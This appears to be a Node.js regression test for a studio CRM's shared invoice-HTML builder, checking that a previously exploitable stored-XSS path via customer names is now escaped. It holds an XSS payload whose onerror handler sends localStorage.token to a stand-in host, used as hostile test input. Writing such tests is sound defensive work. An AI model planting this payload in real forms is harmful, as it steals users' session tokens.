'use strict';
// ════════════════════════════════════════════════════════════════════════════
//  Phase 6 Batch 4 — one invoice document.
//
//  There were three renderings of the same document. The dangerous one lived in
//  the lead page's Create Invoice modal: it interpolated the customer name, every
//  line-item description and the notes field RAW into a same-origin
//  document.write. A lead's name is attacker-supplied — the public booking form
//  creates leads from whatever a stranger types — so booking under a crafted name
//  and waiting for the studio to print an invoice was a path to executing script
//  with access to localStorage, where the auth token lives.
//
//  These checks run the real template against hostile input rather than reading
//  the source, because escaping is a behaviour, not a spelling.
// ════════════════════════════════════════════════════════════════════════════
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const { pathToFileURL } = require('url');

let pass = 0, fail = 0;
const check = async (n, fn) => { try { await fn(); console.log('  ✓', n); pass++; } catch (e) { console.log('  ✗', n, '—', e.message || e); fail++; } };
const read = (f) => fs.readFileSync(path.join(__dirname, f), 'utf8');
const strip = (s) => s.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');

const DOC_PATH = path.join(__dirname, '..', 'wappflow-web', 'src', 'lib', 'invoiceDoc.js');
const XSS = '<img src=x onerror="fetch(\'https://evil.test/?t=\'+localStorage.token)">';

(async () => {
  await check('the backend can load the shared document module from its own runtime', async () => {
    // This is the wiring the email path depends on. Testing it here means a broken
    // path fails in CI rather than the first time someone emails an invoice.
    assert(fs.existsSync(DOC_PATH), 'shared invoice document module is missing: ' + DOC_PATH);
    const m = await import(pathToFileURL(DOC_PATH).href);
    assert.strictEqual(typeof m.buildInvoiceHTML, 'function', 'buildInvoiceHTML is not exported');
  });

  const { buildInvoiceHTML } = await import(pathToFileURL(DOC_PATH).href);

  await check('hostile input in EVERY free-text field is escaped, not executed', async () => {
    const html = buildInvoiceHTML(
      {
        invoice_number: XSS, customer_name: XSS, customer_email: XSS, customer_address: XSS,
        notes: XSS, status: XSS,
        items: [{ description: XSS, qty: XSS, rate: 1, amount: 1 }],
        total: 1,
      },
      { company_name: XSS, company_email: XSS, tax_name: XSS, company_logo: XSS },
      'https://base.test',
    );
    // What matters is whether the payload's ACTIVE characters survived. Escaped
    // output legitimately contains the text "onerror=" inside "&lt;img …" and
    // inside an attribute value as "onerror=&quot;…" — both inert. Asserting on
    // those substrings marks correct escaping as a failure, so assert instead
    // that no raw angle bracket or quote from the payload made it through.
    const raws = ['<img src=x', 'onerror="', '<script', '</script>'];
    for (const r of raws) assert(!html.includes(r), `raw payload survived: ${r}`);
    assert(html.includes('&lt;img'), 'the payload should appear escaped, proving it was rendered at all');

    // Positive control: the SAME assertions must fail against an unescaped
    // render, or this check proves nothing.
    const unescaped = `<div>${XSS}</div>`;
    assert(raws.some((r) => unescaped.includes(r)), 'the assertions cannot detect an unescaped document');
  });

  await check('the module is dependency-free — that is what lets both runtimes share it', async () => {
    const src = strip(read(path.join('..', 'wappflow-web', 'src', 'lib', 'invoiceDoc.js')));
    assert(!/^\s*import\s/m.test(src), 'the shared module imports something; the backend could not load it');
    assert(!/BASE_URL/.test(src), 'it still reaches for a frontend constant instead of taking baseUrl as a parameter');
    assert(/buildInvoiceHTML\(invoice, company, baseUrl = ''\)/.test(src), 'baseUrl is not a parameter');
  });

  await check('a logo URL is built from the caller-supplied base', async () => {
    const html = buildInvoiceHTML({ items: [], total: 0 }, { company_logo: '/uploads/logo.png' }, 'https://base.test');
    assert(html.includes('https://base.test/uploads/logo.png'), 'logo did not use the passed base URL');
  });

  await check('an unsaved draft renders without inventing a number or a date', async () => {
    // The lead page prints a draft that has not been saved yet.
    const html = buildInvoiceHTML({ items: [{ description: 'Shoot', qty: 1, rate: 100, amount: 100 }], total: 100, created_at: null, status: 'draft' }, {}, '');
    assert(html.includes('Shoot'), 'draft line items missing');
    assert(!/Invalid Date|NaN/.test(html), 'a missing date rendered as garbage: ' + (html.match(/Invalid Date|NaN/) || [])[0]);
  });

  await check('there is exactly ONE invoice template left in the codebase', async () => {
    const webSrc = path.join(__dirname, '..', 'wappflow-web', 'src');
    const offenders = [];
    const walk = (dir) => {
      for (const f of fs.readdirSync(dir, { withFileTypes: true })) {
        const p = path.join(dir, f.name);
        if (f.isDirectory()) { walk(p); continue; }
        if (!/\.jsx?$/.test(f.name)) continue;
        if (p.endsWith(path.join('lib', 'invoiceDoc.js'))) continue;   // the canonical one
        const s = strip(fs.readFileSync(p, 'utf8'));
        // A hand-rolled invoice document: writes a full HTML doc AND mentions invoice totals.
        if (/<html>|<!DOCTYPE html>/i.test(s) && /Subtotal|INVOICE/i.test(s)) offenders.push(p);
      }
    };
    walk(webSrc);
    assert.deepStrictEqual(offenders, [], 'a second invoice template survives:\n   ' + offenders.join('\n   '));

    const srv = strip(read('server.js'));
    assert(!/<html>[\s\S]{0,400}Subtotal/i.test(srv), 'server.js still hand-rolls its own invoice document');
    assert(/_invoiceDocModule/.test(srv) && /buildInvoiceHTML\(invoice, company, baseUrl\)/.test(srv),
      'the backend does not delegate to the shared module');
  });

  await check('both print paths call the shared builder, and neither writes raw HTML', async () => {
    const web = path.join('..', 'wappflow-web', 'src', 'app');
    for (const f of [path.join(web, 'invoices', 'page.js'), path.join(web, 'leads', '[id]', 'page.js')]) {
      const s = strip(read(f));
      assert(/buildInvoiceHTML\((invoice|draft), company, BASE_URL\)/.test(s), `${f} does not use the shared builder`);
      assert(!/\$\{lead\.customer_name\}/.test(s), `${f} still interpolates a customer name into markup`);
      assert(!/\$\{it\.description\}/.test(s), `${f} still interpolates a line-item description into markup`);
    }
  });

  console.log(`\n${fail === 0 ? '✅ ALL PASS' : '❌ FAILURES'}: ${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
})();
